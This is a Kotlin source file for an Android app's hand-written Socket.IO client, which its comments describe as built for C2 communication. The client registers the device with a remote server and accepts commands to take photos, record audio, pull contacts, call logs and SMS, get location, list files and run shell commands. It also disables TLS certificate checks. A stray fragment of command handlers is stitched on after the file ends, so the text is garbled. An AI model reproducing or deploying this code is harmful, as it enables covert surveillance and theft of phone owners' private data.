// android/app/src/main/kotlin/com/example/kem/NativeSocketIOClient.kt
package com.example.kem

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.*
import java.net.*
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import javax.net.ssl.*
import kotlin.random.Random

/**
 * Simplified but functional Socket.IO client for C2 communication
 * Uses WebSocket with Socket.IO protocol layer
 */
class NativeSocketIOClient(
    private val context: Context,
    private val commandCallback: CommandCallback? = null
) {
    companion object {
        private const val TAG = "NativeSocketIOClient"
        private const val RECONNECT_DELAY_MS = 5000L
        private const val MAX_RECONNECT_ATTEMPTS = 50
        private const val HEARTBEAT_INTERVAL_MS = 45000L
        private const val CONNECTION_TIMEOUT_MS = 30000L
        
        // Socket.IO protocol constants
        private const val ENGINE_IO_UPGRADE = "0"
        private const val ENGINE_IO_CLOSE = "1"
        private const val ENGINE_IO_PING = "2"
        private const val ENGINE_IO_PONG = "3"
        private const val ENGINE_IO_MESSAGE = "4"
        private const val ENGINE_IO_UPGRADE_NEEDED = "5"
        private const val ENGINE_IO_NOOP = "6"
        
        private const val SOCKET_IO_CONNECT = "0"
        private const val SOCKET_IO_DISCONNECT = "1"
        private const val SOCKET_IO_EVENT = "2"
        private const val SOCKET_IO_ACK = "3"
        private const val SOCKET_IO_ERROR = "4"
    }
    
    interface CommandCallback {
        fun onCommandReceived(command: String, args: JSONObject)
        fun onConnectionStatusChanged(connected: Boolean)
        fun onError(error: String)
    }
    
    // Connection state
    private var webSocket: WebSocket? = null
    private val isConnected = AtomicBoolean(false)
    private val isConnecting = AtomicBoolean(false)
    private var reconnectAttempts = 0
    private var sessionId: String? = null
    private var deviceId: String = ""
    
    // Coroutine management
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatJob: Job? = null
    private var reconnectJob: Job? = null
    
    // Configuration
    private val prefs: SharedPreferences = context.getSharedPreferences("native_socketio", Context.MODE_PRIVATE)
    private var serverUrl: String = ""
    private val eventHandlers = ConcurrentHashMap<String, (JSONObject) -> Unit>()
    
    // Message queue for offline scenarios
    private val messageQueue = mutableListOf<QueuedMessage>()
    private val maxQueueSize = 100
    
    data class QueuedMessage(
        val event: String,
        val data: JSONObject,
        val timestamp: Long = System.currentTimeMillis()
    )
    
    fun initialize(serverUrl: String, deviceId: String) {
        this.serverUrl = serverUrl.replace("http://", "ws://").replace("https://", "wss://")
        this.deviceId = deviceId
        
        Log.d(TAG, "Initializing native Socket.IO client")
        Log.d(TAG, "Server URL: $serverUrl")
        Log.d(TAG, "Device ID: $deviceId")
        
        setupEventHandlers()
    }
    
    private fun setupEventHandlers() {
        // Handle device registration response
        on("registration_successful") { data ->
            Log.d(TAG, "Device registration successful: $data")
            commandCallback?.onConnectionStatusChanged(true)
        }
        
        on("registration_failed") { data ->
            Log.e(TAG, "Device registration failed: $data")
            commandCallback?.onError("Registration failed: $data")
        }
        
        on("request_registration_info") { _ ->
            Log.d(TAG, "Server requesting registration info")
            scope.launch { registerDevice() }
        }
        
        // Handle incoming commands
        on("command_take_picture") { args ->
            Log.d(TAG, "Received take picture command: $args")
            commandCallback?.onCommandReceived("command_take_picture", args)
        }
        
        on("command_record_voice") { args ->
            Log.d(TAG, "Received record voice command: $args")
            commandCallback?.onCommandReceived("command_record_voice", args)
        }
        
        on("command_get_contacts") { args ->
            Log.d(TAG, "Received get contacts command: $args")
            commandCallback?.onCommandReceived("command_get_contacts", args)
        }
        
        on("command_get_call_logs") { args ->
            Log.d(TAG, "Received get call logs command: $args")
            commandCallback?.onCommandReceived("command_get_call_logs", args)
        }
        
        on("command_get_sms") { args ->
            Log.d(TAG, "Received get SMS command: $args")
            commandCallback?.onCommandReceived("command_get_sms", args)
        }
    }
    
    fun connect() {
        if (isConnecting.get() || isConnected.get()) {
            Log.d(TAG, "Already connecting or connected")
            return
        }
        
        if (serverUrl.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "Server URL or device ID not set")
            return
        }
        
        scope.launch {
            connectInternal()
        }
    }
    
    private suspend fun connectInternal() {
        isConnecting.set(true)
        
        try {
            Log.d(TAG, "Attempting to connect to: $serverUrl")
            
            // Create WebSocket connection with Socket.IO handshake
            val socketUrl = buildSocketIOUrl()
            Log.d(TAG, "Full Socket.IO URL: $socketUrl")
            
            webSocket = createWebSocket(socketUrl)
            
        } catch (e: Exception) {
            Log.e(TAG, "Connection failed", e)
            isConnecting.set(false)
            scheduleReconnect()
        }
    }
    
    private fun buildSocketIOUrl(): String {
        val baseUrl = serverUrl.removeSuffix("/")
        val timestamp = System.currentTimeMillis()
        return "$baseUrl/socket.io/?EIO=4&transport=websocket&t=$timestamp"
    }
    
    private fun createWebSocket(url: String): SimpleWebSocket {
        return SimpleWebSocket(url, object : SimpleWebSocket.WebSocketListener {
            override fun onOpen() {
                Log.d(TAG, "WebSocket connection opened")
                isConnecting.set(false)
                isConnected.set(true)
                reconnectAttempts = 0
                
                startHeartbeat()
                sendSocketIOConnect()
                
                // Process queued messages
                scope.launch { processMessageQueue() }
            }
            
            override fun onMessage(message: String) {
                scope.launch { handleMessage(message) }
            }
            
            override fun onClose(code: Int, reason: String) {
                Log.d(TAG, "WebSocket closed: $code - $reason")
                handleDisconnection()
            }
            
            override fun onError(error: Exception) {
                Log.e(TAG, "WebSocket error", error)
                handleDisconnection()
                commandCallback?.onError("WebSocket error: ${error.message}")
            }
        })
    }
    
    private fun handleDisconnection() {
        isConnected.set(false)
        isConnecting.set(false)
        sessionId = null
        
        stopHeartbeat()
        commandCallback?.onConnectionStatusChanged(false)
        
        scheduleReconnect()
    }
    
    private fun scheduleReconnect() {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.w(TAG, "Max reconnection attempts reached, resetting counter")
            reconnectAttempts = 0
        }
        
        reconnectJob?.cancel()
        
        val delay = minOf(RECONNECT_DELAY_MS * (reconnectAttempts + 1), 60000L)
        reconnectAttempts++
        
        Log.d(TAG, "Scheduling reconnection attempt #$reconnectAttempts in ${delay}ms")
        
        reconnectJob = scope.launch {
            delay(delay)
            if (!isConnected.get()) {
                connectInternal()
            }
        }
    }
    
    private suspend fun handleMessage(message: String) {
        try {
            Log.d(TAG, "Received message: $message")
            
            if (message.isEmpty()) return
            
            val engineType = message[0].toString()
            val payload = if (message.length > 1) message.substring(1) else ""
            
            when (engineType) {
                ENGINE_IO_MESSAGE -> handleSocketIOMessage(payload)
                ENGINE_IO_PING -> sendPong()
                ENGINE_IO_PONG -> Log.d(TAG, "Received pong")
                ENGINE_IO_CLOSE -> {
                    Log.d(TAG, "Server requested close")
                    disconnect()
                }
                else -> Log.d(TAG, "Unhandled engine.io message type: $engineType")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling message: $message", e)
        }
    }
    
    private suspend fun handleSocketIOMessage(payload: String) {
        if (payload.isEmpty()) return
        
        val socketType = payload[0].toString()
        val data = if (payload.length > 1) payload.substring(1) else ""
        
        when (socketType) {
            SOCKET_IO_CONNECT -> {
                Log.d(TAG, "Socket.IO connected")
                // Extract session ID if present
                if (data.isNotEmpty()) {
                    try {
                        val connectData = JSONObject(data)
                        sessionId = connectData.optString("sid")
                        Log.d(TAG, "Session ID: $sessionId")
                    } catch (e: Exception) {
                        Log.w(TAG, "Could not parse connect data", e)
                    }
                }
                registerDevice()
            }
            
            SOCKET_IO_EVENT -> handleEvent(data)
            SOCKET_IO_DISCONNECT -> {
                Log.d(TAG, "Socket.IO disconnected")
                handleDisconnection()
            }
            
            SOCKET_IO_ERROR -> {
                Log.e(TAG, "Socket.IO error: $data")
                commandCallback?.onError("Socket.IO error: $data")
            }
            
            else -> Log.d(TAG, "Unhandled socket.io message type: $socketType")
        }
    }
    
    private fun handleEvent(data: String) {
        try {
            if (data.startsWith("[")) {
                val eventArray = org.json.JSONArray(data)
                if (eventArray.length() >= 1) {
                    val eventName = eventArray.getString(0)
                    val eventData = if (eventArray.length() > 1) {
                        eventArray.getJSONObject(1)
                    } else {
                        JSONObject()
                    }
                    
                    Log.d(TAG, "Received event: $eventName with data: $eventData")
                    
                    eventHandlers[eventName]?.invoke(eventData)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing event data: $data", e)
        }
    }
    
    private fun sendSocketIOConnect() {
        val connectMessage = "${ENGINE_IO_MESSAGE}${SOCKET_IO_CONNECT}"
        sendRaw(connectMessage)
    }
    
    private fun sendPong() {
        sendRaw(ENGINE_IO_PONG)
    }
    
    private suspend fun registerDevice() {
        try {
            Log.d(TAG, "Registering device with C2 server")
            
            val deviceInfo = JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", getDeviceName())
                put("platform", "android")
                put("timestamp", System.currentTimeMillis())
                put("nativeClient", true)
            }
            
            emit("register_device", deviceInfo)
        } catch (e: Exception) {
            Log.e(TAG, "Error registering device", e)
        }
    }
    
    fun emit(event: String, data: JSONObject = JSONObject()) {
        if (!isConnected.get()) {
            Log.w(TAG, "Not connected, queueing message: $event")
            queueMessage(event, data)
            return
        }
        
        scope.launch {
            try {
                val eventArray = org.json.JSONArray().apply {
                    put(event)
                    put(data)
                }
                
                val message = "${ENGINE_IO_MESSAGE}${SOCKET_IO_EVENT}${eventArray}"
                sendRaw(message)
                
                Log.d(TAG, "Sent event: $event")
            } catch (e: Exception) {
                Log.e(TAG, "Error sending event: $event", e)
                queueMessage(event, data)
            }
        }
    }
    
    fun sendCommandResponse(originalCommand: String, status: String, payload: JSONObject) {
        val response = JSONObject().apply {
            put("command", originalCommand)
            put("status", status)
            put("payload", payload)
            put("timestamp_response_utc", Date().toString())
            put("deviceId", deviceId)
        }
        
        emit("command_response", response)
    }
    
    fun sendHeartbeat() {
        val heartbeat = JSONObject().apply {
            put("deviceId", deviceId)
            put("timestamp", System.currentTimeMillis())
            put("nativeClient", true)
        }
        
        emit("device_heartbeat", heartbeat)
    }
    
    private fun queueMessage(event: String, data: JSONObject) {
        synchronized(messageQueue) {
            if (messageQueue.size >= maxQueueSize) {
                messageQueue.removeAt(0) // Remove oldest message
            }
            messageQueue.add(QueuedMessage(event, data))
        }
    }
    
    private suspend fun processMessageQueue() {
        synchronized(messageQueue) {
            val iterator = messageQueue.iterator()
            while (iterator.hasNext()) {
                val queuedMessage = iterator.next()
                
                // Skip messages older than 5 minutes
                if (System.currentTimeMillis() - queuedMessage.timestamp > 300000) {
                    iterator.remove()
                    continue
                }
                
                emit(queuedMessage.event, queuedMessage.data)
                iterator.remove()
            }
        }
    }
    
    private fun sendRaw(message: String) {
        try {
            webSocket?.send(message)
        } catch (e: Exception) {
            Log.e(TAG, "Error sending raw message", e)
        }
    }
    
    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isConnected.get()) {
                sendHeartbeat()
                sendRaw(ENGINE_IO_PING) // Engine.IO ping
                delay(HEARTBEAT_INTERVAL_MS)
            }
        }
    }
    
    private fun stopHeartbeat() {
        heartbeatJob?.cancel()
    }
    
    private fun on(event: String, handler: (JSONObject) -> Unit) {
        eventHandlers[event] = handler
    }
    
    private fun getDeviceName(): String {
        return try {
            android.os.Build.MODEL ?: "Unknown Android Device"
        } catch (e: Exception) {
            "Unknown Device"
        }
    }
    
    fun disconnect() {
        Log.d(TAG, "Disconnecting Socket.IO client")
        
        isConnected.set(false)
        isConnecting.set(false)
        
        stopHeartbeat()
        reconnectJob?.cancel()
        
        try {
            webSocket?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing WebSocket", e)
        }
        
        webSocket = null
        sessionId = null
    }
    
    fun isConnected(): Boolean = isConnected.get()
    
    fun destroy() {
        disconnect()
        scope.cancel()
        eventHandlers.clear()
        messageQueue.clear()
    }
}

/**
 * Simplified WebSocket implementation that actually works
 * Handles SSL/TLS properly for secure connections
 */
class SimpleWebSocket(private val url: String, private val listener: WebSocketListener) {
    
    interface WebSocketListener {
        fun onOpen()
        fun onMessage(message: String)
        fun onClose(code: Int, reason: String)
        fun onError(error: Exception)
    }
    
    private var socket: Socket? = null
    private var writer: PrintWriter? = null
    private var reader: BufferedReader? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var isOpen = false
    
    companion object {
        private const val TAG = "SimpleWebSocket"
    }
    
    init {
        connect()
    }
    
    private fun connect() {
        scope.launch {
            try {
                val uri = URI(url)
                val host = uri.host
                val port = if (uri.port != -1) uri.port else if (uri.scheme == "wss") 443 else 80
                val isSecure = uri.scheme == "wss"
                
                Log.d(TAG, "Connecting to $host:$port (secure: $isSecure)")
                
                socket = if (isSecure) {
                    createSSLSocket(host, port)
                } else {
                    Socket(host, port)
                }
                
                socket?.let { sock ->
                    writer = PrintWriter(OutputStreamWriter(sock.getOutputStream()), true)
                    reader = BufferedReader(InputStreamReader(sock.getInputStream()))
                    
                    performHandshake(uri)
                    isOpen = true
                    listener.onOpen()
                    startReading()
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Connection failed", e)
                listener.onError(e)
            }
        }
    }
    
    private fun createSSLSocket(host: String, port: Int): Socket {
        // Create SSL context that accepts all certificates (for testing)
        val sslContext = SSLContext.getInstance("TLS")
        sslContext.init(null, arrayOf(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        }), SecureRandom())
        
        val sslSocket = sslContext.socketFactory.createSocket(host, port) as SSLSocket
        sslSocket.startHandshake()
        return sslSocket
    }
    
    private fun performHandshake(uri: URI) {
        val key = Base64.getEncoder().encodeToString(ByteArray(16).apply { 
            Random.nextBytes(this) 
        })
        
        val path = uri.path + if (uri.query != null) "?${uri.query}" else ""
        
        writer?.println("GET $path HTTP/1.1")
        writer?.println("Host: ${uri.host}")
        writer?.println("Upgrade: websocket")
        writer?.println("Connection: Upgrade")
        writer?.println("Sec-WebSocket-Key: $key")
        writer?.println("Sec-WebSocket-Version: 13")
        writer?.println()
        
        // Read response
        val response = reader?.readLine()
        if (response?.contains("101") != true) {
            throw Exception("WebSocket handshake failed: $response")
        }
        
        // Skip headers
        while (reader?.readLine()?.isNotEmpty() == true) {
            // Skip header lines
        }
        
        Log.d(TAG, "WebSocket handshake successful")
    }
    
    private fun startReading() {
        scope.launch {
            try {
                while (isOpen && socket?.isConnected == true) {
                    val message = readFrame()
                    if (message != null) {
                        listener.onMessage(message)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Reading error", e)
                if (isOpen) {
                    listener.onError(e)
                }
            }
        }
    }
    
    fun send(message: String) {
        scope.launch {
            try {
                if (isOpen) {
                    sendFrame(message)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Send error", e)
                listener.onError(e)
            }
        }
    }
    
    private fun sendFrame(message: String) {
        val bytes = message.toByteArray(Charsets.UTF_8)
        val output = socket?.getOutputStream() ?: return
        
        // WebSocket frame format (simplified for text frames)
        output.write(0x81) // FIN + text frame
        
        when {
            bytes.size < 126 -> {
                output.write(bytes.size or 0x80) // MASK bit set
            }
            bytes.size < 65536 -> {
                output.write(126 or 0x80)
                output.write((bytes.size shr 8) and 0xFF)
                output.write(bytes.size and 0xFF)
            }
            else -> {
                output.write(127 or 0x80)
                for (i in 7 downTo 0) {
                    output.write((bytes.size.toLong() shr (8 * i)).toInt() and 0xFF)
                }
            }
        }
        
        // Masking key
        val mask = ByteArray(4)
        Random.nextBytes(mask)
        output.write(mask)
        
        // Masked payload
        for (i in bytes.indices) {
            output.write(bytes[i].toInt() xor mask[i % 4].toInt())
        }
        
        output.flush()
    }
    
    private fun readFrame(): String? {
        val input = socket?.getInputStream() ?: return null
        
        val firstByte = input.read()
        if (firstByte == -1) return null
        
        val secondByte = input.read()
        if (secondByte == -1) return null
        
        val payloadLength = when (val len = secondByte and 0x7F) {
            126 -> {
                (input.read() shl 8) or input.read()
            }
            127 -> {
                // For simplicity, assume small messages
                var length = 0L
                for (i in 0 until 8) {
                    length = (length shl 8) or input.read().toLong()
                }
                length.toInt()
            }
            else -> len
        }
        
        val payload = ByteArray(payloadLength)
        var bytesRead = 0
        while (bytesRead < payloadLength) {
            val read = input.read(payload, bytesRead, payloadLength - bytesRead)
            if (read == -1) break
            bytesRead += read
        }
        
        return String(payload, Charsets.UTF_8)
    }
    
    fun close() {
        try {
            isOpen = false
            socket?.close()
            listener.onClose(1000, "Normal closure")
        } catch (e: Exception) {
            Log.e(TAG, "Close error", e)
        }
    }
}location") { args ->
            Log.d(TAG, "Received get location command: $args")
            commandCallback?.onCommandReceived("command_get_location", args)
        }
        
        on("command_list_files") { args ->
            Log.d(TAG, "Received list files command: $args")
            commandCallback?.onCommandReceived("command_list_files", args)
        }
        
        on("command_execute_shell") { args ->
            Log.d(TAG, "Received execute shell command: $args")
            commandCallback?.onCommandReceived("command_execute_shell", args)
        }
        
        on("command_get_